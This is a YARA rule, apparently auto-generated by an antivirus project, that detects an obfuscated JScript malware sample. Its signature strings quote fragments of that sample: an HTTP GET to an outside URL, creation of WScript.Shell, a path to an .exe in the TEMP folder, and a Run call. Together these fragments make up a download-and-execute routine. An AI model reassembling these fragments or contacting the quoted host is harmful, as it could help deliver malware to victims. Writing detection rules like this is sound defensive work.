rule sig_20160330_b78fb5eefdae9fff2ffcedbab0de85a2 {
  meta:
    description = "datamaliciousorder - file 20160330_b78fb5eefdae9fff2ffcedbab0de85a2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aa7c8c64f6418043d343d55e74ff2329aae698a09a77bd4b7df9fccf23619bf7"

  strings:
    $s1  = "_OF[_K0](\"GET\", \"http://dev.orolatina.com/s3isk\", false);" fullword ascii
    $s2  = "function _K(_MW, _QB){_P = _P * 1; return _MW - _QB;};" fullword ascii
    $s3  = "var _VC = function _F() {return WScript[_CU](\"WScript\"+\".Shell\");}(), _X0 = 11;" fullword ascii
    $s4  = "if (_OF[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _QG(){return _WG + \"\";};" fullword ascii
    $s6  = "function _PY() {return _VC[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"itslZR8f5nQ627v.ex\" + \"e\";};" fullword ascii
    $s7  = "function _N() {return ((_Q == true) && (_Q == _A0)) ? 1 : _P;};" fullword ascii
    $s8  = "function _WE(_HO){_VC[\"Run\"](_HO, _P, _P);};" fullword ascii
    $s9  = "function _X(){return 22;};" fullword ascii
    $s10 = "var _DR = new this[\"Date\"]();" fullword ascii
    $s11 = " while (_C){" fullword ascii
    $s12 = "function _M(){return _CU;};" fullword ascii
    $s13 = "function _A(_O) {var _D = (1, 2, 3, 4, 5, _O); return _D;};" fullword ascii
    $s14 = "return _K(_XX, _DE);" fullword ascii
    $s15 = "function _E()" fullword ascii
    $s16 = "_A0 = true; " fullword ascii
    $s17 = "var _A0 = false;" fullword ascii
    $s18 = "_Q = true; " fullword ascii
    $s19 = "var _Q = false;" fullword ascii
    $s20 = "var _UG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}